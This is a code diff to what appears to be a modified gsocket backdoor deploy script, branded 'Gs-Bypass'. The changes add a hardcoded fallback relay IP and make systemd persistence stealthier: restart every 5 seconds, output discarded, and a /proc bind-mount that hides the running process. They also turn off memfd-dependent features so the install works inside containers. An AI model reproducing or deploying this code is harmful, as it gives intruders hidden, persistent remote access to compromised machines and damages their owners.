@@ -11,6 +11,7 @@ unset GS_NOEVAL
 ###----BEGIN changed by CICD script-----
 CICD_GS_BRANCH="beta"
 GS_HOST_MASTER_IP="$(ping -4 -c1 "$(printf '%s.gs.thc.org\n' {a..z} | shuf -n1)" 2>/dev/null | sed -n '1s/.*(\(.*\)).*/\1/p')"
+[ -z "$GS_HOST_MASTER_IP" ] && GS_HOST_MASTER_IP="212.132.98.170"
 ###-----END-----
 [[ $CICD_GS_BRANCH == "master" ]] && unset CICD_GS_BRANCH
 [[ -z $GS_BRANCH ]] && GS_BRANCH="${CICD_GS_BRANCH}"
@@ -1766,8 +1767,24 @@ install_systemd_add() {
 	local sfdata="$1"
 	local param="$2"
 	local len="70"
-	do_config2bin "${DSTBIN}" "${DSTBIN}" "${param:--ilq}" "${PROC_HIDDEN_NAME}" || return 255
+	local _saved_ffpid="$GS_FFPID"
+	local _saved_memexec="$GS_MEMEXEC"
+	local _saved_reexec="$GS_REEXEC"
+	local _saved_bc="$GS_BC"
+	# Disable memfd-dependent features â€” memfd_create is blocked in containers (OpenVZ/Docker)
+	GS_FFPID=''
+	GS_MEMEXEC=''
+	GS_REEXEC=''
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "${param:--ilq}" "${PROC_HIDDEN_NAME}" || {
+		GS_FFPID="$_saved_ffpid"; GS_MEMEXEC="$_saved_memexec"; GS_REEXEC="$_saved_reexec"
+		return 255
+	}
+	GS_FFPID="$_saved_ffpid"
+	GS_MEMEXEC="$_saved_memexec"
+	GS_REEXEC="$_saved_reexec"
+	GS_BC=''  # skip bincrypter for systemd â€” wrapper juga pakai memfd_create
 	do_bincrypter "${DSTBIN}"
+	GS_BC="$_saved_bc"
 
 	[[ -n "$CDC" ]] && ((len+=11)) 
 	printf "%-${len}.${len}s" "$(echo -e "Installing as systemd ${CB}${SERVICE_HIDDEN_NAME}.service${CN}..............................................")"
@@ -1849,15 +1866,18 @@ install_systemd_new() {
 ${meta}
 
 [Service]
-Restart=always
 Type=simple
 ExecStart=${DSTBIN}
 ExecStartPost=/bin/sh -c 'mount --bind /proc/2 /proc/\$MAINPID 2>/dev/null; true'
+Restart=always
+RestartSec=5
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target"
-		param="-ilqD"
-		[ -z "$GS_NOCCG" ] && GS_CCG=1 # Change CGROUP
+		param="-ilq"
+		SYSTEMD_INSTALL_CHECK_IS_ACTIVE=1
 	else
 		# HERE: A systemd supervised service
 		sfdata="[Unit]
@@ -2547,7 +2567,7 @@ gs_hide_pid() {
 init_vars
 
 [[ "$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
-[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
+{ [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]]; } && uninstall
 
 init_setup
 [[ -n $GS_BRANCH ]] && WARN "Using Gs-Bypass By bboscat"
